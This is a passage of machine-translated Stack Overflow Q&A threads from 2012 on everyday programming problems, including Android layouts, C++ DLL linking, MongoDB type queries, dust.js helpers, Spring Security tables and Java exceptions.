    super.onCreate(savedInstanceState);
    requestWindowFeature(Window.FEATURE_NO_TITLE); 
    this.getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,WindowManager.LayoutParams.FLAG_FULLSCREEN); 
    setContentView(R.layout.sample);
    setRequestedOrientation(ActivityInfo.SCREEN_ORIENTATION_PORTRAIT);
    final SlidingDrawer slider = (SlidingDrawer) findViewById(R.id.slidingD1);
    Display d = getWindowManager().getDefaultDisplay();
    DisplayMetrics dm = new DisplayMetrics();
    d.getMetrics(dm);
    Log.d("DISPLAYINFO", "Classified density: " + dm.densityDpi + ", scaled density: " + dm.scaledDensity + ", actual densities: x: " + dm.xdpi + ", y: " + dm.ydpi);
    slider.animateOpen();

    Button next = (Button) findViewById(R.id.img1);
    .....

    next.setOnClickListener(new View.OnClickListener() {

        public void onClick(View view) {
        ((ImageView) findViewById(R.id.imageV1)).setImageResource(0);
        ((ImageView) findViewById(R.id.imageV1)).setImageResource(R.drawable.image1);
        slider.animateClose();
        } 
    });
    ......
}
} 
```

和 xml 文件：

```
<RelativeLayout xmlns:android="http://schemas.android.com/apk/res/android"
xmlns:tools="http://schemas.android.com/tools"
android:layout_width="match_parent"
android:layout_height="match_parent">

<ScrollView 
   android:layout_width="wrap_content"
   android:layout_height="wrap_content">
   <RelativeLayout 
       android:layout_width="wrap_content"
       android:layout_height="wrap_content">    

<ImageView 
    android:id="@+id/imageV1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:adjustViewBounds="true"
    android:scaleType="fitStart"/>

</RelativeLayout>
 </ScrollView>

<SlidingDrawer
    android:id="@+id/slidingD1"
    android:layout_width="fill_parent"
    android:layout_height="fill_parent"
    android:layout_alignParentBottom="true"
    android:layout_centerHorizontal="true"
    android:content="@+id/content"
    android:handle="@+id/handle">

    <Button
        android:id="@+id/handle"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Select Sample"/>

    <RelativeLayout
        android:id="@+id/content"
        android:layout_width="match_parent"
        android:layout_height="match_parent"
        android:background="@drawable/background_image">

        <ScrollView
            android:layout_width="match_parent"
            android:layout_height="match_parent"
            android:layout_alignParentLeft="true" >

            <RelativeLayout
                android:layout_width="fill_parent"
                android:layout_height="fill_parent" >

                <Button
                    android:id="@+id/samp1"
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:layout_alignParentLeft="true"
                    android:background="@drawable/samplethumb1"
                    android:text="Sample1"
                    android:textColor="#FFFFFF"
                    android:textSize="20dp"
                    android:textStyle="bold"
                    android:typeface="serif" /> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:00:48.490

检查 LogCat，它是否声明错误，例如

> OpenGLRenderer：位图太大而无法上传到纹理中

任何地方？变化是，您的 10.1 平板电脑与小型设备有很大不同，因为它**在 Ice Cream Sandwich 上运行**。*这意味着默认情况下会打开*硬件加速，这可能会将您的图像大小在两个维度上最大化为 2048 像素。

如果这似乎是问题所在，请尝试[为您的活动关闭硬件加速](http://developer.android.com/guide/topics/graphics/hardware-accel.html#controlling)。不幸的是，目前不支持为单个视图关闭它。

# c++ - C++ 中的 DLL 编程

> ID：13217897
> 
> 赞同：-1
> 
> 时间：2012-11-04T10:52:59.500
> 
> 标签：c++

您好我正在尝试使用 dll 运行应用程序。我正在使用 Dev C++，但我总是收到链接器错误。dll.h 的代码是

```
#ifndef _DLL_H_
#define _DLL_H_

#if BUILDING_DLL
#define DLLIMPORT __declspec (dllexport)
#else 
#define DLLIMPORT __declspec (dllimport)
#endif 

class DLLIMPORT sum
{
  public:
    sum();
    void input();
    void add();
    void display();
    virtual ~sum(void);

  private:
          int x,y,res;

};

#endif 

and that of dllmain.cpp is
#include<iostream>
#include "dll.h"
#include <windows.h>
sum::sum()
{
 x=y=res=0;
}

sum::~sum()
{
}
void sum::input()
{
     std::cout<<"Enter two numbers ";
     std::cin>>x>>y;
}
void sum::add()
{
     res=x+y;
}
void sum::display()
{
     std::cout<<"The application in running under a dll file"<<std::endl;
     std::cout<<"The sum is "<<res<<std::endl;
}              

BOOL APIENTRY DllMain (HINSTANCE hInst     /* Library instance handle. */ ,
                       DWORD reason        /* Reason this function is being called. */ ,
                       LPVOID reserved     /* Not used. */ )
{
    switch (reason)
    {
      case DLL_PROCESS_ATTACH:
        break;

      case DLL_PROCESS_DETACH:
        break;

      case DLL_THREAD_ATTACH:
        break;

      case DLL_THREAD_DETACH:
        break;
    }

    /* Returns TRUE on success, FALSE on failure */
    return TRUE;
} 
```

主机应用程序 (sample.cpp) 代码是

```
#include<iostream>
#include "dll.h"
using namespace std;
int main()
{
    sum s;
    s.input();
    s.add();
    s.display();
    system("pause");
    return 0;
} 
```

但我得到一个链接器错误说：

```
 [Linker error] undefined reference to `_imp___ZN3sumC1Ev@4' 
  [Linker error] undefined reference to `_imp___ZN3sum5inputEv@4' 
  [Linker error] undefined reference to `_imp___ZN3sum3addEv@4' 
  [Linker error] undefined reference to `_imp___ZN3sum7displayEv@4' 
  [Linker error] undefined reference to `_imp___ZN3sum7displayEv@4' 
  [Linker error] undefined reference to `_imp___ZN3sum7displayEv@4' 
  [Linker error] undefined reference to `_imp___ZN3sum7displayEv@4' 
```

我不知道该怎么办。我刚开始 dll 编程，但我坚持这一点。任何人都可以帮我解决这个问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T11:02:59.320

您的`DLLIMPORT`符号扩展为`__declspec(dllexport)`if `BUILDING_DLL`is `#define`'d。

因此，在您的 DLL 实现文件 ( `dllmain.cpp`) 中，您应该`#define` `BUILDING_DLL` *在* `#include "dll.h"`.

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:04:46.680

你`DLLIMPORT`这样定义：

```
#if BUILDING_DLL
#define DLLIMPORT __declspec (dllexport)
#else
#define DLLIMPORT __declspec (dllimport)
#endif 
```

但是您忘记`BUILDING_DLL`在包含以下内容之前在您的 dll 源文件中定义`dll.h`：

```
#define BUILDING_DLL
#include "dll.h" 
```

*注意*：您应该使用：

```
#ifdef BUILDING_DLL 
```

代替

```
#if BUILDING_DLL 
```

因为第一个是更多的自我记录。

# linux - 在 RapidSVN 中添加 svn:keywords 在 Google 代码中不起作用

> ID：13217901
> 
> 赞同：1
> 
> 时间：2012-11-04T10:53:19.140
> 
> 标签：linux, svn, google-code, rapidsvn

我使用 RapidSVN 作为 svn 客户端并设置 svn:keywords 我必须转到每个文件，右键单击 > Properties > New > Name = svn:keywords > Value = Id > OK

这还不是问题，因为该项目没有很多文件，但我无法使其正常工作。当我将新版本提交到我的 GoogleCode 存储库时，我的本地文件会更改 Id 值，但它不会发生在远程 GoogleCode 存储库中。当我看到远程文件的内容时，ID 没有改变。

谁能告诉我为什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-04T16:28:19.253

你必须准确地解释你是如何做到这一点的。

与其他 RCS 和可能的 CVS 不同，Subversion 不会自动扩展关键字。使用关键字有两个部分：

1.  将文件中的属性设置为`svn:keywords`要扩展的关键字。这些仅限于：
    *   网址
    *   作者
    *   日期
    *   ID
    *   修订
2.  将关键字放在由美元符号包围的文件中。

像这样：

```
$Author$ 
```

这将扩展为：

```
$Author: dweintaub$ 
```

你在做这一切吗？

关键字扩展的整个想法现在被认为是一个过时的概念，并不是一个好主意。只要您的代码在 Subversion 中，您就可以在不进行关键字扩展的情况下获得所有这些（以及更多）。

很多时候，这被用来查看编译时使用了哪些版本的软件。但是，如果您正在编译代码，则有更好的嵌入修订数据的方法。例如，您可能正在使用创建构建号的构建系统。更好的做法是在编译时将内部版本号简单地嵌入到单个文件中，这样您就可以在*About Box*中查看它。

所以，如果你真的不能让它工作，那也不是那么糟糕。它使您免于不再被认为是 CM 的好主意的做法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T22:09:35.893

> 当我将新版本提交到我的 GoogleCode 存储库时，我的本地文件会更改 Id 值，但它不会发生在远程 GoogleCode 存储库中

只是不要担心和忘记，如果**在客户端**你得到**预期的结果**：扩展关键字。一些服务器端回购浏览器使用“公平”的方法来访问数据（作为 svn-client），一些 - 不是。因为 SVN-keywords*仅在 client*中展开，而不是直接在 repository-data 中展开，所以您可以在服务器视图中看到关键字而不是 real-data，但这没有意义：比较[Repo-Browser 中 File](https://www.assembla.com/code/customlocations-greylink/subversion/nodes/trunk/Local/Local.ini?rev=1191)的输出（前 3 行）和 real输出给任何用户

```
svn cat https://subversion.assembla.com/svn/customlocations-greylink/trunk/Local/Local.ini
// $Revision: 991 $
// $Date: 2010-08-18 21:22:02 +0600 (╨б╤А, 18 ╨░╨▓╨│ 2010) $
// $Author: Infinity_Love $
... 
```

# c++ - PVS-Studio 不处理头文件

> ID：13217903
> 
> 赞同：0
> 
> 时间：2012-11-04T10:53:29.603
> 
> 标签：c++, pvs-studio

我尝试对我的项目进行静态代码分析，该项目基本上由 .hpp 文件组成，因为那里的一切都是“模板化的”，但不幸的是，我从 PSV-Studio 获得了无法处理头文件的信息。这似乎有点奇怪。在现代 C++ 模板中无处不在，AFAIC 它们大多放在头文件中。我错过了什么吗？有没有办法设置 PVS-Studio 对头文件进行分析？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-06-28T12:03:18.860

PVS-Studio 确实支持对“模板化”代码的分析，即使它没有被实例化。

但是，PVS-Studio 需要对文件进行预处理才能对其进行分析，即所有#include 和宏都应在分析之前展开。为此，PVS-Studio 需要一个可编译文件，即与必要的编译器标志（定义、包含等）一起传递给编译器的文件。只有一个头文件是不够的，因为 PVS-Studio 没有足够的信息来正确预处理它。

“无法开始对此文件进行分析”很可能是 V008 错误，这意味着预处理器以非 zer 代码退出，这意味着您尝试分析的文件是不可编译的。通常，PVS-Studio 还会将错误原因（来自预处理程序的 stdErr）作为下一条消息输出。[您可以在此处](http://www.viva64.com/en/d/0304/#ID0EUIBG)更详细地了解它。

# c - 如何在 c 中测试线程安全的实现？

> ID：13217904
> 
> 赞同：4
> 
> 时间：2012-11-04T10:53:54.237
> 
> 标签：c, multithreading, testing, thread-safety

我有一个我想测试的线程安全程序（见下文）。我不确定如何继续启动测试程序，因为这将是我的第一个测试程序。结果应该是一个使用这个线程安全程序实现的演示，以及为什么它是测试像示例这样的线程安全程序的最佳替代方案。

```
#include <errno.h>
#include <pthread.h>
static pthread_mutex_t listlock = PTHREAD_MUTEX_INITIALIZER;

int accessdata_r(void) {  /* return nonnegative traversal key if successful */ 
   int error;   
   int key;
   if (error = pthread_mutex_lock(&listlock)) {        /* no mutex, give up */
      errno = error;
      return -1; 
   }
   key = accessdata();
   if (key == -1) {
      error = errno;
      pthread_mutex_unlock(&listlock);
      errno = error;
      return -1;
   }
   if (error = pthread_mutex_unlock(&listlock)) {
      errno = error;
      return -1;
   }
   return key;
}

int adddata_r(data_t data) {        /* allocate a node on list to hold data */
   int error;
   if (error = pthread_mutex_lock(&listlock)) {        /* no mutex, give up */
      errno = error;
      return -1;
   }
   if (adddata(data) == -1) {
      error = errno;
      pthread_mutex_unlock(&listlock);
      errno = error;
      return -1;
   }
   if (error = pthread_mutex_unlock(&listlock)) {
      errno = error;
      return -1;
   }
   return 0; 
}

int getdata_r(int key, data_t *datap) {             /* retrieve node by key */
   int error;
   if (error = pthread_mutex_lock(&listlock)) {        /* no mutex, give up */
      errno = error;
      return -1;
   }
   if (getdata(key, datap) == -1) {
      error = errno;
      pthread_mutex_unlock(&listlock);
      errno = error;
      return -1;
   }
   if (error = pthread_mutex_unlock(&listlock)) {
      errno = error;
      return -1;
   }
   return 0; 
}

int freekey_r(int key) {                                    /* free the key */
   int error;
   if (error = pthread_mutex_lock(&listlock)) {        /* no mutex, give up */
      errno = error;
      return -1;
   }
   if (freekey(key) == -1) {
      error = errno;
      pthread_mutex_unlock(&listlock);
      errno = error;
      return -1;
   }
   if (error = pthread_mutex_unlock(&listlock)) {
      errno = error; 
      return -1;   
   } 
   return 0;  
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:19:45.013

这是测试您的实现的相对简单的选项，这不是唯一的现有选项。

1.  创建一个将 X 项添加到列表中的函数（可以是常规计数器）
2.  创建一个在循环中检索相同数据的函数。

3.  创建几个线程 (pthread_create) 并分配给每个函数。

4.  通过这种方式，您可以查看是否没有 dedlocks，为了检查正确性，您应该在插入期间添加某种类型的时间戳（您需要插入一个与时间戳元组的值），为每个线程保存一些数组来保存结果，最后打印您的结果并查看时间戳是否保持正确性。

# node.js - dust.js 通过函数格式化文本

> ID：13217906
> 
> 赞同：3
> 
> 时间：2012-11-04T10:54:20.197
> 
> 标签：node.js, mongodb, express, socket.io, dust.js

我有一个模糊文本的javascript函数：

```
function blurlines(data) {
    var dataSplit = data.split(" ");
    var lastWord = dataSplit.pop();
    var toBlur = '<span class="blur">' + dataSplit.join(" ") +  '</span>'; 
// Blur entire sentace, show only last word
     var output = '<li>' + toBlur + lastWord + '</li>';
     return output;
} 
```

我试图通过尝试以下方法来使其与dust.js一起使用：

```
{#storylines}
    <script>
        blurlines("{text}");
    </script>                   
{/storylines} 
```

有没有办法通过 JS 函数轻松传递 {text} 值，然后渲染输出？

如果我在控制台中运行它似乎可以工作：

`> blurlines("This is a test line")`

`> "<li><span class="blur">This is a test</span>line</li>"`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T23:04:38.400

我做了类似的事情，在我的全局上下文中创建一个辅助函数：

```
var dustCtx = dust.makeBase({
    blurText: function(chunk, context, bodies, params) { 
        var dataSplit = params.data.split(" ");
        var lastWord = dataSplit.pop();
        var toBlur = '<span class="blur">' + dataSplit.join(" ") +  '</span>'; 
        var output = '<li>' + toBlur + lastWord + '</li>';
        return chunk.write(output);
    }
}); 
```

在渲染时将其与本地上下文合并：

```
dust.render("template", dustCtx.push({storylines:...}), function(err, out) {}); 
```

然后这样称呼它：

```
{#storylines}
    {#blurText data=text/}
{/storylines} 
```

例如，如果您想控制模糊，这种方法对于传递其他参数可能很方便。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-04T21:03:48.103

我创建了一个dust.js 过滤器来让它工作

```
 bl: function(value){  var dataSplit = value.split(" ");
    var lastWord = dataSplit.pop();
    var toBlur = '<span class="blur">' + dataSplit.join(" ") +  '</span>'; 
     var output = toBlur + lastWord;
     return output; } 
```

并在模板中传递以下内容：

```
{#storylines}
    <li>{text|bl|s}</li>    
{/storylines} 
```

# windows - nodeJS 是否存在现有的事件 COM（组件对象模型）绑定

> ID：13217907
> 
> 赞同：7
> 
> 时间：2012-11-04T10:54:45.567
> 
> 标签：windows, node.js, com

我有一个客户通过 Windows 组件对象模型 (COM) 连接 IRIS Exchequer 会计套件。我正在重写他们现有的 Exchequer 集成层，并希望用 Express 中的非阻塞 RESTful 服务替换它。我已经完成了 npm 搜索和一些谷歌搜索，但似乎找不到任何直接连接 COM 的绑定。

那里有这样的模块吗？如果没有，人们将如何着手实施这样的模块？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2020-10-28T14:39:44.103

我知道这是一个老问题，但我什至在 2020 年就一直在寻找答案。谢天谢地，现在似乎有更多选择。例如，[这篇文章](https://helloacm.com/using-com-object-in-nodejs/)谈到了它。它正在使用这个（非常旧的）模块：[https ://github.com/idobatter/node-win32ole](https://github.com/idobatter/node-win32ole)

还有另一个较新的名称[`winax`](https://www.npmjs.com/package/winax)：[https ://github.com/durs/node-activex](https://github.com/durs/node-activex)

我还偶然发现了[https://www.npmjs.com/package/activex/](https://www.npmjs.com/package/activex/)，但它看起来很陈旧，并说“正在开发中。不要使用！”

我实际上还没有尝试过任何这些，但`winax`看起来最有希望。

# mongodb - 在 mongodb 中按 $type 编号查找

> ID：13217908
> 
> 赞同：6
> 
> 时间：2012-11-04T10:55:01.337
> 
> 标签：mongodb

我有以下文件

```
> db.people.insert({name: "Bob"})
> db.people.insert({name: 42}) 
```

如果我需要按类型查找，`String`我可以使用：

```
> db.people.find({name: { $type: 2 }) 
```

其中[2 是字符串的类型号](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-%24type)

但是我怎么能按类型找到`Number`呢？

```
> typeof db.people.findOne({name: 42}).name
number 
```

[可能的类型](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-%24type)`number`中没有类型。

**upd**：我尝试按 16 和 18 类型查找。这是行不通的。

```
> db.people.find({ name: 42 })
{ "_id" : ObjectId("509645ae5013826ee61d96ac"), "name" : 42 }
> db.people.find({name: { $type: 16 }})
> db.people.find({name: { $type: 18 }}) 
```

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-04T12:13:23.693

JavaScript ( )中只有[一种数字类型](http://en.wikipedia.org/wiki/JavaScript_syntax#Number)`Number`，它以二进制表示为 IEEE 754 浮点数 (double)。

在[BSON 规范](http://bsonspec.org/#/specification)中，这将表示为双精度（类型 1），因此您应该能够找到：

```
db.people.find({name: { $type: 1 }}) 
```

`mongo`如果你想插入不同的 BSON[数据类型](http://www.mongodb.org/display/DOCS/Data+Types+and+Conventions)，有一些shell 助手：

```
42              // Type 1:  double (64-bit IEEE 754 floating point, 8 bytes)
NumberInt(42)   // Type 16: int32  (32-bit signed integer, 4 bytes)
NumberLong(42)  // Type 18: int64  (64-bit signed integer, 8 bytes) 
```

例如：

```
db.people.insert({ name: 'default', num: 42 })
db.people.insert({ name: 'NumberLong', num: NumberLong(42) })
db.people.insert({ name: 'NumberInt', num: NumberInt(42) }) 
```

如果您对可以以多种格式表示的数字执行 a 操作，不同的数字表示仍将匹配`find()`（即 32 位整数也可以表示为 double 或 int64）。

例如：

```
db.people.find({num:42})
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f45"),
    "name" : "default",
    "num" : 42
}
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f46"),
    "name" : "NumberLong",
    "num" : NumberLong(42)
}
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f47"),
    "name" : "NumberInt",
    "num" : 42
} 
```

但是，如果您通过 找到`$type`，则 BSON 表示是不同的：

```
> db.people.find({num: { $type: 1 }})
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f45"),
    "name" : "default",
    "num" : 42
}

> db.people.find({num: { $type: 16 }})
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f47"),
    "name" : "NumberInt",
    "num" : 42
}

> db.people.find({num: { $type: 18 }})
{
    "_id" : ObjectId("50965aa3038d8c8e85fd3f46"),
    "name" : "NumberLong",
    "num" : NumberLong(42)
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-04T11:24:34.663

在 javascript 中，int32 和 int64 之间没有真正的区别。然而，Mongodb shell 使用 32 位，除非另有说明（使用 Number(..) 构造函数）。

您应该尝试这样查询：

```
db.people.find({name: { $type: 16 }) 
```

其中 16 是整数的类型代码：[http ://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-%24type](http://www.mongodb.org/display/DOCS/Advanced+Queries#AdvancedQueries-%24type)

# spring - Spring 安全表

> ID：13217918
> 
> 赞同：2
> 
> 时间：2012-11-04T10:56:42.087
> 
> 标签：spring, spring-security

在 spring 安全文档中，有五个要创建的表。

1.users 2.authorities（将用户映射到权限） 3.groups 4.groups_authorities（将组映射到权限） 5.group_members（将用户映射到组）

为什么我们需要将用户和权限都映射到组？如果我们将权威或用户映射到组，我们不能推导出另一种关系吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T10:59:12.457

由于这种方法，每个用户都可以拥有一些额外的权限——在他/她的任何组中都没有授予的权限。

例如：

*   `user1`是成组的`admins`，`plain_users`
*   `admins`组有权限`ROLE_ADMIN`
*   `plain_users`组有权限`ROLE_USER`
*   `user1`有一些额外的权限`ROLE_SUPER_USER`

在成功通过身份验证后，他/她`List<GrantedAuthority>`包含`ROLE_ADMIN`,`ROLE_USER`和 ... 那个额外的`ROLE_SUPER_USER`权限。

# php - favicon 生成器脚本在 php 代码中给出了一些小错误

> ID：13217920
> 
> 赞同：-1
> 
> 时间：2012-11-04T10:56:52.477
> 
> 标签：php, favicon

嗨，朋友们，当我尝试提交图像时，我只是创建了一个 php favicon 图像生成器的演示，它以您选择的固定大小显示图像，但它也给出了一个错误，那就是

```
Strict Standards: Only variables should be passed by reference in 
C:\xampp\htdocs\demo123\index.php on line 40 
```

第 40 行

```
$ext = end(explode(".",strtolower(trim($_FILES["image"]["name"])))); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-04T11:05:12.870

来自[PHP.net](http://bd.php.net/manual/en/language.references.pass.php)

```
The following things can be passed by reference:

- Variables, i.e. foo($a)
- New statements, i.e. foo(new foobar())
- [References returned from functions][2] 
```

所以改变你的代码如下

```
$data = trim($_FILES["image"]["name"]);
$data = strtolower($data);
$data = explode(".",$data);
$ext = end($data); 
```

**或者**

```
$ext = pathinfo($_FILES["image"]["name"], PATHINFO_EXTENSION); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:06:57.980

If you just want to suppress the error message, you can add an "@" sign in front of that line.

Although I think the message might be caused by trying to pass along $_FILES[], but I can't test it atm.

# java - 在java中使用split方法时如何保留重复值

> ID：13217927
> 
> 赞同：0
> 
> 时间：2012-11-04T10:57:25.923
> 
> 标签：java, split

我有一个包含重复值的字符串。我正在使用 split() 方法将其拆分为子字符串。问题是 split() 返回不同值的数组，我需要保留重复值。如何实现这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:05:48.390

split 不会删除重复项。它返回一个数组而不是一个集合。

```
String text = "dup dup dup dup dup dup dup dup";
String[] parts = text.split(" ");
System.out.println(Arrays.toString(parts)); 
```

印刷

```
[dup, dup, dup, dup, dup, dup, dup, dup] 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-04T11:51:07.943

使用这样的 HashSet：

```
Set<String> set = new HashSet<String>();
Collections.addAll(set,yourString.split(**split parameter**)); 
```

# c# - 任何等效于 VB.net 函数名称作为 C# 中的返回值？

> ID：13217932
> 
> 赞同：2
> 
> 时间：2012-11-04T10:58:41.027
> 
> 标签：c#, vb.net

在 vb.net 中有一种奇怪的方法，您可以使用函数名作为结果变量。

例子：

```
Function Foo(ByVal bar As Integer) As List(Of Integer)
    Foo = New List(Of Integer)
    Foo.Add(bar + 1)
End Function 
```

据我所知，在 C# 中你必须：

```
List<int> foo(int bar) 
{
     var result = new List<int>();
     result.Add(bar + 1);
     return result;
} 
```

我不确定它是否是设计使然，或者我只是不知道这样做的正确方法..请启发我！

在此先感谢，艾坦。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-04T11:06:56.167

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:03:26.110

据我所知，没有 C# 等价物。`return`但是，它只是 VB 中的糖语法，因为在幕后，函数名称无论如何都会被行为替换。

使用函数名作为返回参数的可读性值得商榷。大多数人不喜欢它。

`return`还提供了函数名称所没有的优势，在特定位置解析方法。

# c - 带约束的迷宫求解

> ID：13217938
> 
> 赞同：3
> 
> 时间：2012-11-04T10:59:18.873
> 
> 标签：c, multithreading, algorithm, maze

我知道解决迷宫是 Stack Overflow 上经常讨论的话题。这是一个大家可能感兴趣的问题。

将给出一个 *n 矩阵形式的迷宫作为输入。每个元素将位于 0-9 之间。还会给出一系列数字，每个数字都在 0-9 之间。矩阵和序列数组的维数也是已知的。问题是在矩阵中找到满足给定序列的从 (0,0) 到 (n-1,n-1) 的所有可能路径。路径只能向下、向右或向下+向右移动。必须使用线程来完成。

输入和输出格式在下面给出的示例中说明 -

示例： [Example1 http://gowthams.in/etc/1.PNG](http://gowthams.in/etc/1.PNG) [Example2 http://gowthams.in/etc/2.PNG](http://gowthams.in/etc/2.PNG) [Example3 http://gowthams.in/etc/3.PNG](http://gowthams.in/etc/3.PNG)

每个线程可以打印其位置 (i,j) 或更新某种数据结构以供稍后处理。

解决这个问题的最佳方法是什么？

这是一个家庭作业问题，我可以寻求帮助。我不是在寻找任何类型的代码。我只想要一些正确方向的指示。

谢谢！

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T12:41:37.123

谢谢你的确切陈述。

1）这句话似乎很令人不安：

> 您应该为矩阵中的每个条目创建线程以确保并行扫描。

因为这意味着对于矩阵 NxN，您肯定需要创建 N ^(2 个)线程，这对我来说太多了。

但是，您的解决方案更加危险：您想开始检查路线并为每次检查创建一个新线程。这将创建解决任务所需的**指数级新线程。**您肯定需要某种优化：这称为动态优化：您将单元格是否`(i,j)`可用于完成从`idx`索引到目标单元格的序列存储在共享内存中。这样您就不必多次解决同一个子任务。我建议您为每个此类任务创建条件锁`[i,j,idx]`并使用它来告诉依赖它的线程何时子线程完成。

2）多路径对你来说不是问题：如果我正确阅读了作业，你只是对这样的路径是否存在感兴趣，而不是找到所有解决方案。

我没有按照要求给出确切的解决方案，只是给出了指示。这也正是我倾向于帮助家庭工人的方式。

# java - 使用包 exp4j 总是返回 UnknownFunctionExpression 和 UnparsableExpressionException

> ID：13217940
> 
> 赞同：3
> 
> 时间：2012-11-04T10:59:31.557
> 
> 标签：java

我必须为我的 java 项目解析一个包含公式的字符串，并且我想使用包 exp4j (http://www.objecthunter.net/exp4j/index.html) 来执行此操作。但我总是得到同样的错误。它可能真的很愚蠢，但遗憾的是我错过了它。所以这就是我尝试过的：

我只是尝试了这个进行测试：

```
import de.congrace.exp4j.Calculable;
import de.congrace.exp4j.ExpressionBuilder;

public class Tester {
  public static void main (String[] args){
    Calculable calc = new ExpressionBuilder("3+2").build();
  }
} 
```

现在eclipse告诉我未处理的异常类型UnknownFunctionExpression和未处理的异常类型UnparsableExpressionException。

之后，我尝试仅使用上述网站上的示例之一：

```
import de.congrace.exp4j.Calculable;
import de.congrace.exp4j.ExpressionBuilder;

public class Tester {
  public static void main (String[] args){
    double varX = 2;
    double varY = 3;

    Calculable calc = new ExpressionBuilder("3 * sin(y) - 2 / (x - 2)")
      .withVariable("x", varX)
      .withVariable("y", varY)
      .build();
    double result1=calc.calculate();
  }
} 
```

导致与上述相同的异常。

抱歉英语不好，我是德国人，感谢您的帮助:)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-04T11:03:25.673

该错误告诉您可能会发生已检查的异常，因此您必须自己处理。

您可以使用 try/catch 来处理它，也可以使用 throws 子句声明异常

```
public static void main (String[] args) throws UnparsableExpressionException{

    Calculable calc = new ExpressionBuilder("3+2").build();

} 
```

或者您可以将代码包装在 try/catch 中以处理异常。

```
try {
    Calculable calc = new ExpressionBuilder("3+2").build();
}
catch(UnparsableExpressionException ex){
ex.printstacktrace();
} 
```

也遵循同样的`UnknownFunctionExpression`方法。并在此处阅读有关[java 中的异常处理的信息](http://docs.oracle.com/javase/tutorial/essential/exceptions/)

# c++ - C ++如何将字符串转换为字符

> ID：13217944
> 
> 赞同：1
> 
> 时间：2012-11-04T11:00:16.640
> 
> 标签：c++

```
int main
{
  string data;
  data = "q";

  char myChoice;

  myChoice = data.c_str();
} 
```

我尝试使用`c_str()`，但它不起作用。我如何转换`string`为`char`?

**或者更确切地说我想问**

```
int main()
{
  char myInput;
  // How to check user input is either a , b or c for char.
  cout << "Your Input ";
  cin >> myInput;
} 
```

因为`string`我可以使用`getline(cin,mystringvariable)`，然后我使用 if-else 语句检查我的字符串变量。

但是char呢？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-04T11:11:03.573

`char`您可以将字符串视为's的数组。您可以使用类`operator[]`重载`std::string`从字符串中提取单个字符：

```
// string data;
char myChoice = data[0]; // first char in "data" 
```

对于问题的第二部分，您可以像检查字符串一样检查`char`变量：`if...else`

```
char myInput;
...
if (myInput == 'a')
{
   ...
}
else if (myInput == 'b')
{
   ...
}
... 
```

或者您也可以使用`switch`语句。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-04T11:23:21.103

you can't convert a string to a char you will have to convert it to char array. if you want to grab a single character from a string you can do it by putting index of the character like data[index] and assign it to character variable.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-04T11:12:02.797

您可以使用 stdio.h 中的 getchar()。

```
int main() {
  char c;
  c = getchar();
  return (0);
} 
```

# android - 点击外的弹出窗口设置为 false [setOutsideTouchable(false)] 不起作用

> ID：13217946
> 
> 赞同：2
> 
> 时间：2012-11-04T11:00:24.427
> 
> 标签：android, popupwindow, layout-inflater

//创建layoutinflator try {

```
 LayoutInflater inflator = LayoutInflater.from(this); 
```

//创建视图

```
 final View menuview = inflater.inflate(R.layout.menu,
                (ViewGroup) findViewById(R.layout.dictionarylist));

        Button Menu = (Button) findViewById(R.id.Menu);

        Menu.setOnClickListener(new Button.OnClickListener() {
            public void onClick(View v) {

                final PopupWindow pw = new PopupWindow(menuview);//initialize popupwindow

                pw.showAtLocation(v, Gravity.CENTER, 0, 0);
                pw.update(0, 0, 200, 250);
                pw.setOutsideTouchable(false);//set outside touch to false 
```

//弹出窗口内按钮的onclick监听器

```
 Button b1 = (Button) menuview.findViewById(R.id.btnClose);
                b1.setOnClickListener(new OnClickListener() {

                    // @Override
                    public void onClick(View v) {
                        pw.dismiss();

                    }

                });
                Button b2 = (Button) menuview.findViewById(R.id.btnQuiz);
                b2.setOnClickListener(new OnClickListener() {

                    // @Override
                    public void onClick(View v) {

                    }

                });
                Button b3 = (Button) menuview.findViewById(R.id.btnTopic);
                b3.setOnClickListener(new OnClickListener() {

                    // @Override
                    public void onClick(View v) {

                        InitialTask2 Task1 = new InitialTask2();
                        Task1.execute();

                    }

                });
                Button b4 = (Button) menuview
                        .findViewById(R.id.btnDictionarylist);
                b4.setOnClickListener(new OnClickListener() {

                    // @Override
                    public void onClick(View v) {

                        try{
                        if(getApplication() != null){
                            pw.dismiss();
                        }
                        else{
